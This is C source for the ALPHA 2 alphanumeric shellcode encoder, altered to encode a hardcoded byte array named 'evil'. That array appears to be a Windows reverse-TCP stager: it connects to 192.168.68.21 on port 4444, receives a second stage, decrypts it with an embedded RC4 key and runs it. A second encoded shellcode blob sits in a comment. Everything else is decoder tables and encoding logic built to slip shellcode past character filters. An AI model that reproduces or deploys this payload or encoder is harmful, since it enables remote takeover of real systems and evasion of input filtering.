#include <stdio.h> // printf(), fprintf(), stderr  
#include <stdlib.h> // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()  
#include <string.h> // strcasecmp(), strstr()  
#include <sys/time.h> //struct timeval, struct timezone, gettimeofday()  
  
#define VERSION_STRING "ALPHA 2: Zero-tolerance. (build 07)"  
#define COPYRIGHT      "Copyright (C) 2003, 2004 by Berend-Jan Wever."  
/* 
________________________________________________________________________________ 
 
    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance. 
   SS"  Y$P"  SY"  ,SY 
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding. 
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever. 
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl> 
________________________________________________________________________________ 
 
  This program is free software; you can redistribute it and/or modify it under 
  the terms of the GNU General Public License version 2, 1991 as published by 
  the Free Software Foundation. 
 
  This program is distributed in the hope that it will be useful, but WITHOUT 
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS 
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more 
  details. 
 
  A copy of the GNU General Public License can be found at: 
    http://www.gnu.org/licenses/gpl.html 
  or you can write to: 
    Free Software Foundation, Inc. 
    59 Temple Place - Suite 330 
    Boston, MA  02111-1307 
    USA. 
 
Acknowledgements: 
  Thanks to rix for his phrack article on aphanumeric shellcode. 
  Thanks to obscou for his phrack article on unicode-proof shellcode. 
  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code. 
  Thanks to spoonm for inspiration and suggestions, check out his 1337 perl 
            conversion of ALPHA in the metasploit framework (with polymorphism!) 
*/  
  
#define mixedcase_w32sehgetpc           "VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36" \  
                                        "FFFFTXVj0PPTUPPa301089"  
#define uppercase_w32sehgetpc           "VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYY" \  
                                        "P5YYYD5KKYAPTTX638TDDNVDDX4Z4A638618" \  
                                        "16"  
#define mixedcase_ascii_decoder_body    "jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"  
#define uppercase_ascii_decoder_body    "VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0B" \  
                                        "BXP8ACJJI"  
#define mixedcase_unicode_decoder_body  "jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIA" \  
                                        "IAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA" \  
                                        "ZBABABABABkMAGB9u4JB"  
#define uppercase_unicode_decoder_body  "QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5" \  
                                        "AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB" \  
                                        "QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB3" \  
                                        "0APB944JB"  
  
struct decoder {  
  char* id; // id of option  
  char* code; // the decoder  
} mixedcase_ascii_decoders[] = {  
  { "nops",     "IIIIIIIIIIIIIIIIII7" mixedcase_ascii_decoder_body },  
  { "eax",      "PYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "ecx",      "IIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "edx",      "JJJJJJJJJJJJJJJJJ7RY" mixedcase_ascii_decoder_body },  
  { "ebx",      "SYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "esp",      "TYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "ebp",      "UYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "esi",      "VYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "edi",      "WYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "[esp-10]", "LLLLLLLLLLLLLLLLYIIIIIIIIIQZ" mixedcase_ascii_decoder_body },  
  { "[esp-C]",  "LLLLLLLLLLLLYIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },  
  { "[esp-8]",  "LLLLLLLLYIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },  
  { "[esp-4]",  "LLLLYIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },  
  { "[esp]",    "YIIIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },  
  { "[esp+4]",  "YYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "[esp+8]",  "YYYIIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },  
  { "[esp+C]",  "YYYYIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "[esp+10]", "YYYYYIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },  
  { "[esp+14]", "YYYYYYIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "[esp+18]", "YYYYYYYIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },  
  { "[esp+1C]", "YYYYYYYYIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },  
  { "seh",      mixedcase_w32sehgetpc "IIIIIIIIIIIIIIIII7QZ" // ecx code  
                mixedcase_ascii_decoder_body },  
  { NULL, NULL }  
}, uppercase_ascii_decoders[] = {  
  { "nops",     "IIIIIIIIIIII" uppercase_ascii_decoder_body },  
  { "eax",      "PYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "ecx",      "IIIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "edx",      "JJJJJJJJJJJRY" uppercase_ascii_decoder_body },  
  { "ebx",      "SYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "esp",      "TYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "ebp",      "UYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "esi",      "VYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "edi",      "WYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "[esp-10]", "LLLLLLLLLLLLLLLLYII7QZ" uppercase_ascii_decoder_body },  
  { "[esp-C]",  "LLLLLLLLLLLLYIIII7QZ" uppercase_ascii_decoder_body },  
  { "[esp-8]",  "LLLLLLLLYIIIIII7QZ" uppercase_ascii_decoder_body },  
  { "[esp-4]",  "LLLL7YIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "[esp]",    "YIIIIIIIIII7QZ" uppercase_ascii_decoder_body },  
  { "[esp+4]",  "YYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "[esp+8]",  "YYYIIIIIIIII7QZ" uppercase_ascii_decoder_body },  
  { "[esp+C]",  "YYYYIIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "[esp+10]", "YYYYYIIIIIIII7QZ" uppercase_ascii_decoder_body },  
  { "[esp+14]", "YYYYYYIIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "[esp+18]", "YYYYYYYIIIIIII7QZ" uppercase_ascii_decoder_body },  
  { "[esp+1C]", "YYYYYYYYIIIIIIIQZ" uppercase_ascii_decoder_body },  
  { "seh",      uppercase_w32sehgetpc "IIIIIIIIIIIQZ" // ecx code  
                uppercase_ascii_decoder_body },  
  { NULL, NULL }  
}, mixedcase_ascii_nocompress_decoders[] = {  
  { "nops",     "7777777777777777777777777777777777777" mixedcase_ascii_decoder_body },  
  { "eax",      "PY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "ecx",      "77777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "edx",      "77777777777777777777777777777777777RY" mixedcase_ascii_decoder_body },  
  { "ebx",      "SY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "esp",      "TY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "ebp",      "UY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "esi",      "VY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "edi",      "WY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp-10]", "LLLLLLLLLLLLLLLLY777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp-C]",  "LLLLLLLLLLLLY7777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp-8]",  "LLLLLLLLY77777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp-4]",  "LLLL7Y77777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp]",    "Y7777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp+4]",  "YY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp+8]",  "YYY77777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp+C]",  "YYYY7777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp+10]", "YYYYY777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp+14]", "YYYYYY77777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp+18]", "YYYYYYY7777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "[esp+1C]", "YYYYYYYY777777777777777777777777777QZ" mixedcase_ascii_decoder_body },  
  { "seh",      mixedcase_w32sehgetpc "77777777777777777777777777777777777QZ" // ecx code  
                mixedcase_ascii_decoder_body },  
  { NULL, NULL }  
}, uppercase_ascii_nocompress_decoders[] = {  
  { "nops",     "777777777777777777777777" uppercase_ascii_decoder_body },  
  { "eax",      "PY77777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "ecx",      "7777777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "edx",      "7777777777777777777777RY" uppercase_ascii_decoder_body },  
  { "ebx",      "SY77777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "esp",      "TY77777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "ebp",      "UY77777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "esi",      "VY77777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "edi",      "WY77777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp-10]", "LLLLLLLLLLLLLLLLY77777QZ" uppercase_ascii_decoder_body },  
  { "[esp-C]",  "LLLLLLLLLLLLY777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp-8]",  "LLLLLLLLY7777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp-4]",  "LLLL7Y7777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp]",    "Y777777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp+4]",  "YY77777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp+8]",  "YYY7777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp+C]",  "YYYY777777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp+10]", "YYYYY77777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp+14]", "YYYYYY7777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp+18]", "YYYYYYY777777777777777QZ" uppercase_ascii_decoder_body },  
  { "[esp+1C]", "YYYYYYYY77777777777777QZ" uppercase_ascii_decoder_body },  
  { "seh",      uppercase_w32sehgetpc "7777777777777777777777QZ" // ecx code  
                uppercase_ascii_decoder_body },  
  { NULL, NULL }  
}, mixedcase_unicode_decoders[] = {  
  { "nops",     "IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444" mixedcase_unicode_decoder_body },  
  { "eax",      "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },  
  { "ecx",      "IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444" mixedcase_unicode_decoder_body },  
  { "edx",      "RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },  
  { "ebx",      "SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },  
  { "esp",      "TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },  
  { "ebp",      "UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },  
  { "esi",      "VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },  
  { "edi",      "WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },  
  { "[esp]",    "YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44" mixedcase_unicode_decoder_body },  
  { "[esp+4]",  "YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },  
  { NULL, NULL }  
}, uppercase_unicode_decoders[] = {  
  { "nops",     "IAIAIAIA4444" uppercase_unicode_decoder_body },  
  { "eax",      "PPYAIAIAIAIA" uppercase_unicode_decoder_body },  
  { "ecx",      "IAIAIAIA4444" uppercase_unicode_decoder_body },  
  { "edx",      "RRYAIAIAIAIA" uppercase_unicode_decoder_body },  
  { "ebx",      "SSYAIAIAIAIA" uppercase_unicode_decoder_body },  
  { "esp",      "TUYAIAIAIAIA" uppercase_unicode_decoder_body },  
  { "ebp",      "UUYAIAIAIAIA" uppercase_unicode_decoder_body },  
  { "esi",      "VVYAIAIAIAIA" uppercase_unicode_decoder_body },  
  { "edi",      "WWYAIAIAIAIA" uppercase_unicode_decoder_body },  
  { "[esp]",    "YAIAIAIAIA44" uppercase_unicode_decoder_body },  
  { "[esp+4]",  "YUYAIAIAIAIA" uppercase_unicode_decoder_body },  
  { NULL, NULL }  
}, mixedcase_unicode_nocompress_decoders[] = {  
  { "nops",     "444444444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "eax",      "PPYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "ecx",      "444444444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "edx",      "RRYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "ebx",      "SSYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "esp",      "TUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "ebp",      "UUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "esi",      "VVYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "edi",      "WWYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "[esp]",    "YA4444444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { "[esp+4]",  "YUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },  
  { NULL, NULL }  
}, uppercase_unicode_nocompress_decoders[] = {  
  { "nops",     "44444444444444" uppercase_unicode_decoder_body },  
  { "eax",      "PPYA4444444444" uppercase_unicode_decoder_body },  
  { "ecx",      "44444444444444" uppercase_unicode_decoder_body },  
  { "edx",      "RRYA4444444444" uppercase_unicode_decoder_body },  
  { "ebx",      "SSYA4444444444" uppercase_unicode_decoder_body },  
  { "esp",      "TUYA4444444444" uppercase_unicode_decoder_body },  
  { "ebp",      "UUYA4444444444" uppercase_unicode_decoder_body },  
  { "esi",      "VVYA4444444444" uppercase_unicode_decoder_body },  
  { "edi",      "WWYA4444444444" uppercase_unicode_decoder_body },  
  { "[esp]",    "YA444444444444" uppercase_unicode_decoder_body },  
  { "[esp+4]",  "YUYA4444444444" uppercase_unicode_decoder_body },  
  { NULL, NULL }  
};  
  
struct decoder* decoders[] = {  
  mixedcase_ascii_decoders, uppercase_ascii_decoders,  
  mixedcase_unicode_decoders, uppercase_unicode_decoders,  
  mixedcase_ascii_nocompress_decoders, uppercase_ascii_nocompress_decoders,  
  mixedcase_unicode_nocompress_decoders, uppercase_unicode_nocompress_decoders  
};  
void version(void) {  
  printf(  
    "________________________________________________________________________________\n"  
    "\n"  
    "    ,sSSs,,s,  ,sSSSs,  " VERSION_STRING "\n"  
    "   SS\"  Y$P\"  SY\"  ,SY \n"  
    "  iS'   dY       ,sS\"   Unicode-proof uppercase alphanumeric shellcode encoding.\n"  
    "  YS,  dSb    ,sY\"      " COPYRIGHT "\n"  
    "  `\"YSS'\"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>\n"  
    "________________________________________________________________________________\n"  
    "\n"  
  );  
  exit(EXIT_SUCCESS);  
}  
  
void help(char* name) {  
  printf(  
    "Usage: %s [OPTION] [BASEADDRESS]\n"  
    "ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.\n"  
    "The result can optionaly be uppercase-only and/or unicode proof. It is a encoded\n"  
    "version of your origional shellcode. It consists of baseaddress-code with some\n"  
    "padding, a decoder routine and the encoded origional shellcode. This will work\n"  
    "for any target OS. The resulting shellcode needs to have RWE-access to modify\n"  
    "it's own code and decode the origional shellcode in memory.\n"  
    "\n"  
    "BASEADDRESS\n"  
    "  The decoder routine needs have it's baseaddress in specified register(s). The\n"  
    "  baseaddress-code copies the baseaddress from the given register or stack\n"  
    "  location into the apropriate registers.\n"  
    "eax, ecx, edx, ecx, esp, ebp, esi, edi\n"  
    "  Take the baseaddress from the given register. (Unicode baseaddress code using\n"  
    "  esp will overwrite the byte of memory pointed to by ebp!)\n"  
    "[esp], [esp-X], [esp+X]\n"  
    "  Take the baseaddress from the stack.\n"  
    "seh\n"  
    "  The windows \"Structured Exception Handler\" (seh) can be used to calculate\n"  
    "  the baseaddress automatically on win32 systems. This option is not available\n"  
    "  for unicode-proof shellcodes and the uppercase version isn't 100%% reliable.\n"  
    "nops\n"  
    "  No baseaddress-code, just padding.  If you need to get the baseaddress from a\n"  
    "  source not on the list use this option (combined with --nocompress) and\n"  
    "  replace the nops with your own code. The ascii decoder needs the baseaddress\n"  
    "  in registers ecx and edx, the unicode-proof decoder only in ecx.\n"  
    "-n\n"  
    "  Do not output a trailing newline after the shellcode.\n"  
    "--nocompress\n"  
    "  The baseaddress-code uses \"dec\"-instructions to lower the required padding\n"  
    "  length. The unicode-proof code will overwrite some bytes in front of the\n"  
    "  shellcode as a result. Use this option if you do not want the \"dec\"-s.\n"  
    "--unicode\n"  
    "  Make shellcode unicode-proof. This means it will only work when it gets\n"  
    "  converted to unicode (inserting a '0' after each byte) before it gets\n"  
    "  executed.\n"  
    "--uppercase\n"  
    "  Make shellcode 100%% uppercase characters, uses a few more bytes then\n"  
    "  mixedcase shellcodes.\n"  
    "--sources\n"  
    "  Output a list of BASEADDRESS options for the given combination of --uppercase\n"  
    "  and --unicode.\n"  
    "--help\n"  
    "  Display this help and exit\n"  
    "--version\n"  
    "  Output version information and exit\n"  
    "\n"  
    "See the source-files for further details and copying conditions. There is NO\n"  
    "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n"  
    "\n"  
    "Acknowledgements:\n"  
    "  Thanks to rix for his phrack article on aphanumeric shellcode.\n"  
    "  Thanks to obscou for his phrack article on unicode-proof shellcode.\n"  
    "  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.\n"  
    "\n"  
    "Report bugs to <skylined@edup.tudelft.nl>\n",  
    name  
  );  
  exit(EXIT_SUCCESS);  
}  
  
//-----------------------------------------------------------------------------  
int main(int argc, char* argv[], char* envp[]) {  
  int   uppercase = 0, unicode = 0, sources = 0, w32sehgetpc = 0,  
        nonewline = 0, nocompress = 0, options = 0, spaces = 0;  
  char* baseaddress = NULL;  
  int   i, input, A, B, C, D, E, F;  
  char* valid_chars;  
  
  // Random seed  
  struct timeval tv;  
  struct timezone tz;  
  gettimeofday(&tv, &tz);  
  srand((int)tv.tv_sec*1000+tv.tv_usec);  
  
  // Scan all the options and set internal variables accordingly  
  for (i=1; i<argc; i++) {  
         if (strcmp(argv[i], "--help") == 0) help(argv[0]);  
    else if (strcmp(argv[i], "--version") == 0) version();  
    else if (strcmp(argv[i], "--uppercase") == 0) uppercase = 1;  
    else if (strcmp(argv[i], "--unicode") == 0) unicode = 1;  
    else if (strcmp(argv[i], "--nocompress") == 0) nocompress = 1;  
    else if (strcmp(argv[i], "--sources") == 0) sources = 1;  
    else if (strcmp(argv[i], "--spaces") == 0) spaces = 1;  
    else if (strcmp(argv[i], "-n") == 0) nonewline = 1;  
    else if (baseaddress == NULL) baseaddress = argv[i];  
    else {  
      fprintf(stderr, "%s: more then one BASEADDRESS option: `%s' and `%s'\n"  
                      "Try `%s --help' for more information.\n",  
                      argv[0], baseaddress, argv[i], argv[0]);  
      exit(EXIT_FAILURE);  
    }  
  }  
  
  // No baseaddress option ?  
  if (baseaddress == NULL) {  
    fprintf(stderr, "%s: missing BASEADDRESS options.\n"  
                    "Try `%s --help' for more information.\n", argv[0], argv[0]);  
    exit(EXIT_FAILURE);  
  }  
  // The uppercase, unicode and nocompress option determine which decoder we'll  
  // need to use. For each combination of these options there is an array,  
  // indexed by the baseaddress with decoders. Pointers to these arrays have  
  // been put in another array, we can calculate the index into this second  
  // array like this:  
  options = uppercase+unicode*2+nocompress*4;  
  // decoders[options] will now point to an array of decoders for the specified  
  // options. The array contains one decoder for every possible baseaddress.  
  
  // Someone wants to know which baseaddress options the specified options  
  // for uppercase, unicode and/or nocompress allow:  
  if (sources) {  
    printf("Available options for %s%s alphanumeric shellcode:\n",  
           uppercase ? "uppercase" : "mixedcase",  
           unicode ? " unicode-proof" : "");  
    for (i=0; decoders[options][i].id != NULL; i++) {  
      printf("  %s\n", decoders[options][i].id);  
    }  
    printf("\n");  
    exit(EXIT_SUCCESS);  
  }  
  
  
  if (uppercase) {  
    if (spaces) valid_chars = " 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ";  
    else valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ";  
  } else {  
    if (spaces) valid_chars = " 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";  
    else valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";  
  }  
  
  // Find and output decoder  
  for (i=0; strcasecmp(baseaddress, decoders[options][i].id) != 0; i++) {  
    if (decoders[options][i+1].id == NULL) {  
      fprintf(stderr, "%s: unrecognized baseaddress option `%s'\n"  
                      "Try `%s %s%s--sources' for a list of BASEADDRESS options.\n",  
                      argv[0], baseaddress, argv[0],  
                      uppercase ? "--uppercase " : "",  
                      unicode ? "--unicode " : "");  
      exit(EXIT_FAILURE);  
    }  
  }  
  printf("%s", decoders[options][i].code);  
  
unsigned char evil[] = "\xFC\xE8\x82\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xD5\xB8\x90\x01\x29\xC4\x54\x50\x68\x29\x80\x6B\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xD5\x97\x6A\x05\x68\xC0\xA8\x44\x15\x68\x02\x11\x5C\x89\xE6\x6A\x10\x56\x57\x68\x99\xA5\x74\x61\xD5\x85\xC0\x74\x0C\x4E\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xD5\x6A\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xD5\x8B\x36\x81\xF6\x4B\x58\x4F\x52\x8D\x0E\x6A\x40\x68\x10\x51\x6A\x68\x58\xA4\x53\xE5\xD5\x8D\x98\x01\x53\x56\x50\x6A\x56\x53\x57\x68\x02\xD9\xC8\x5F\xD5\x01\xC3\x29\xC6\x75\xEE\x5B\x59\x5D\x55\x57\x89\xDF\xE8\x10\x6B\x69\x6C\x6C\x65\x72\x76\x75\x6C\x74\x75\x72\x65\x31\x32\x33\x5E\x31\xC0\xAA\xFE\xC0\x75\xFB\x81\xEF\x01\x31\xDB\x02\x1C\x07\x89\xC2\x80\xE2\x0F\x02\x1C\x16\x8A\x14\x07\x86\x14\x1F\x88\x14\x07\xFE\xC0\x75\xE8\x31\xDB\xFE\xC0\x02\x1C\x07\x8A\x14\x07\x86\x14\x1F\x88\x14\x07\x02\x14\x1F\x8A\x14\x17\x30\x55\x45\x49\x75\xE5\x5F\xC3";

/*
"\xda\xd1\xd9\x74\x24\xf4\x58\xba\x05\xf6\xdf\x74\x29\xc9\xb1"

"\x31\x83\xc0\x04\x31\x50\x14\x03\x50\x11\x14\x2a\x88\xf1\x5a"

"\xd5\x71\x01\x3b\x5f\x94\x30\x7b\x3b\xdc\x62\x4b\x4f\xb0\x8e"

"\x20\x1d\x21\x05\x44\x8a\x46\xae\xe3\xec\x69\x2f\x5f\xcc\xe8"

"\xb3\xa2\x01\xcb\x8a\x6c\x54\x0a\xcb\x91\x95\x5e\x84\xde\x08"

"\x4f\xa1\xab\x90\xe4\xf9\x3a\x91\x19\x49\x3c\xb0\x8f\xc2\x67"

"\x12\x31\x07\x1c\x1b\x29\x44\x19\xd5\xc2\xbe\xd5\xe4\x02\x8f"

"\x16\x4a\x6b\x20\xe5\x92\xab\x86\x16\xe1\xc5\xf5\xab\xf2\x11"

"\x84\x77\x76\x82\x2e\xf3\x20\x6e\xcf\xd0\xb7\xe5\xc3\x9d\xbc"

"\xa2\xc7\x20\x10\xd9\xf3\xa9\x97\x0e\x72\xe9\xb3\x8a\xdf\xa9"

"\xda\x8b\x85\x1c\xe2\xcc\x66\xc0\x46\x86\x8a\x15\xfb\xc5\xc0"

"\xe8\x89\x73\xa6\xeb\x91\x7b\x96\x83\xa0\xf0\x79\xd3\x3c\xd3"

"\x3e\x2b\x77\x7e\x16\xa4\xde\xea\x2b\xa9\xe0\xc0\x6f\xd4\x62"

"\xe1\x0f\x23\x7a\x80\x0a\x6f\x3c\x78\x66\xe0\xa9\x7e\xd5\x01"

"\xf8\x1c\xb8\x91\x60\xcd\x5f\x12\x02\x11";

*/

printf("....................input...............");
for (int j=0;j < sizeof(evil); j++){
   
   input=evil[j];
   //printf("%c",input);
	
   //printf("input:%c", input);
// encoding AB -> CD 00 EF 00

  // read, encode and output shellcode  
 // while ((input = getchar()) != EOF) {  
    // encoding AB -> CD 00 EF 00  
    A = (input & 0xf0) >> 4;  
    B = (input & 0x0f);  
  
    F = B;  
    // E is arbitrary as long as EF is a valid character  
    i = rand() % strlen(valid_chars);  
    while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }  
    E = valid_chars[i] >> 4;  
    // normal code uses xor, unicode-proof uses ADD.  
    // AB ->  
    D =  unicode ? (A-E) & 0x0f : (A^E);  
    // C is arbitrary as long as CD is a valid character  
    i = rand() % strlen(valid_chars);  
    while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }  
    C = valid_chars[i] >> 4;  
  
    printf("%c%c", (C<<4)+D, (E<<4)+F);  
  }  
  printf("A%s", nonewline ? "" : "\n"); // Terminating "A"  
  
  exit(EXIT_SUCCESS);  
} 








